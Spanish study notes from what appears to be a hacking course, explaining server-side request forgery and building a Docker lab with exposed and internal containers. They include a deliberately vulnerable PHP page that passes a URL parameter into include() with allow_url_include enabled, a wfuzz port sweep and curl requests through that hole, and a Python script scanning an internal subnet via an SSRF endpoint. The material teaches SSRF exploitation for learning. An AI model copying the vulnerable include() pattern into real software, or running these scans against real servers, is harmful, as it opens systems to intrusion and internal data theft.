- Tags: #recursos #docker #docker_network 
El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.

En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.

El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.

Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.

Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.

En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.

Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

- **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
- **nombre_de_red**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción ‘**–driver**‘ en el comando ‘docker network create’ para especificar el controlador de red que deseamos utilizar.

Por ejemplo, si queremos crear una red de tipo “**bridge**“, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción ‘**–driver=bridge**‘ para indicar que deseamos crear una red de tipo “**bridge**“. La opción –driver nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.

**Recurso SSRF**:  [https://blog.hackmetrix.com/ssrf-server-side-request-forgery/](https://blog.hackmetrix.com/ssrf-server-side-request-forgery/)

![[Pasted image 20260121165924.png]]

Con apache2 nos creamos un servidor que si esta expuesto por el puerto 80 y mediante este intentaremos extraer la información de nuestro server en el 4646
Nos creamos una utilidad en php que nos permita pasar y acceder a una url pasada por parametros
```php
#utility.php

<?php
    if(isset($_GET['url'])){
        $url = $_GET['url'];         
        echo "[+] La URL introducida es: \n" . $url . "<br>"; 
        include($url);
    }
    else{
        echo "[-] No se ha pasado el par  metro 'url'";
    }
?>
```

Modificamos el fichero php.ini
```bash
root@286640e9741e:/var/www/html# find / -name php.ini 2>/dev/null
/etc/php/8.3/cli/php.ini
/etc/php/8.3/apache2/php.ini
root@286640e9741e:/var/www/html# nano /etc/php/8.3/apache2/php.ini

#Directiva modificada con propositos de entender el SSRF
;allow_url_include = Off
allow_url_include = On
```

Desde l url probamos y nos lleva al sitio pasado por parametros
`http://localhost:8081/utility.php?url=https://www.google.com`

Con python creamos un servidor que no este expuesto y solo puede ser accedido desde el localhost de la maquina no desde fuera
```bash
cd /tmp
nano login.html #Simulando un entorno de preproduccion 

python3 -m http.server 4646 --bind 127.0.0.1
```

Pues mediante la utilidad que tenemos en el servidor expuesto con apache podemos acceder a este otro servidor interno en la maquina
```
http://localhost:8081/utility.php?url=http://127.0.0.1:4646/login.html
```

Seria necesario antes de probar identificar si hay algún oro servidor interno en la maquina para acceder al puerto disponible para esto tendríamos que hacer fuzzing
```bash
wfuzz -c -t 200 -hl=3 -z range 1,65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

![[Pasted image 20260122002606.png]]

En este escenario nos crearemos 3 contenedores de docker en redes pprivadas para representar el escenario de la imagen.

```bash
#Crear la red de docker
docker network create --subnet=10.0.0.0/24 network1

#Crear los entornos
docker run -dit --name PRO ubuntu    #Entorno PRO
docker network connect network1 PRO  #Lo conectamos a la red creada
docker exec -it PRO bash    #Nos conectamos al contenedor
apt install apache2 php iproute2 iputils-ping nano -y #Instalamos sftw
nano /etc/php/8.3/apache2/php.ini #Cambiar allow_url_include=On para poder hacer la inclusion de url en la peticion

docker run -dit --network=network1 --name PRE ubuntu  #Entorno PRE
docker exec -it PRE bash    #Nos conectamos al contenedor
apt install apache2 php iproute2 iputils-ping nano -y #Instalamos sftw
nano /etc/apache2/ports.conf #Cambiamos puerto de escucha de apache 4646
#Se puede crear el servidor con python de igual manera 
apt install python3 
python3 -m http.server 4646 

docker run -dit --name ATTAKER ubuntu   #Atacante
docker exec -it PRE bash    #Nos conectamos al contenedor
apt install iproute2 iputils-ping curl -y #Instalamos sftw
#Peticion al servidor que tenemos accesoo explotando la vulnarabilidad
curl "http://172.17.0.2/utility.php?url=http://10.0.0.2:4646/nota.txt"

#Asi reflejamos el escenario
```

![[Pasted image 20260122091525.png]]

![[Pasted image 20260122102050.png]]

```PYTHON
#Scaner para ver atravez de SSRF si existen redes internas 
import requests
import time

TARGET = "https://victima.com/check?url="

def test(ip):
    url = TARGET + f"http://{ip}"
    try:
        start = time.time()
        # Se realiza la petición con un timeout de 5 segundos
        r = requests.get(url, timeout=5)
        elapsed = time.time() - start
        return r.status_code, round(elapsed, 2)
    except Exception:
        # Si hay timeout o error de conexión, devolvemos valores por defecto
        return "timeout", 5

def scan():
    base = "10.0.0."
    print(f"[*] Iniciando escaneo en el segmento {base}0/24...\n")
    
    for i in range(1, 255):
        ip = base + str(i)
        code, t = test(ip)
        
        print(f"{ip} -> {code} ({t}s)")
        
        # Si obtenemos una respuesta (aunque sea un error 404), el host existe
        if code != "timeout":
            print(f"[+] Posible host encontrado: {ip}")

if __name__ == "__main__":
    scan()
```